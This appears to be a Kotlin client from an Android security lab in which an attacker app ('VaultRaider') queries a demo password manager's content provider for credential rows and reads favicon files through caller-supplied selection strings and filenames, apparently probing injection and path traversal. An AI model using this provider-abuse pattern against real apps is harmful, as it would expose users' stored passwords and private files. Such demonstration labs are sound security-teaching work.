package dev.guillermomartin.vaultraider.client

import android.content.Context
import android.net.Uri

/**
 * Direct ContentResolver client against VaultKeeper's provider. VaultRaider has no legitimate
 * relationship with VaultKeeper — that's why this client defines its own copy of the
 * authority/URIs instead of depending on the :vaultkeeper module; in real life an attacker
 * wouldn't have access to the victim's source code either.
 */
class VaultKeeperClient(private val context: Context) {

    fun queryCredentials(
        selection: String?,
        selectionArgs: Array<String>? = null,
        sortOrder: String? = null,
    ): AttackResult {
        return try {
            context.contentResolver.query(CREDENTIALS_URI, null, selection, selectionArgs, sortOrder).use { cursor ->
                if (cursor == null) return AttackResult.Failure("query() returned null")
                val rows = buildList {
                    val columns = cursor.columnNames
                    while (cursor.moveToNext()) {
                        val row = columns.associateWith { col -> cursor.getString(cursor.getColumnIndexOrThrow(col)) }
                        add(row)
                    }
                }
                AttackResult.Success(rows)
            }
        } catch (e: Exception) {
            AttackResult.Failure("${e.javaClass.simpleName}: ${e.message}")
        }
    }

    fun readFavicon(filename: String): AttackResult {
        return try {
            val bytes = context.contentResolver.openInputStream(faviconUri(filename))?.use { it.readBytes() }
                ?: return AttackResult.Failure("openFile() returned null")
            AttackResult.RawBytes(bytes)
        } catch (e: Exception) {
            AttackResult.Failure("${e.javaClass.simpleName}: ${e.message}")
        }
    }

    companion object {
        private const val TARGET_AUTHORITY = "dev.guillermomartin.vaultkeeper.provider"
        private val CREDENTIALS_URI: Uri = Uri.parse("content://$TARGET_AUTHORITY/credentials")

        private fun faviconUri(filename: String): Uri =
            Uri.parse("content://$TARGET_AUTHORITY/favicons/$filename")
    }
}

sealed interface AttackResult {
    data class Success(val rows: List<Map<String, String?>>) : AttackResult
    data class RawBytes(val bytes: ByteArray) : AttackResult
    data class Failure(val reason: String) : AttackResult
}
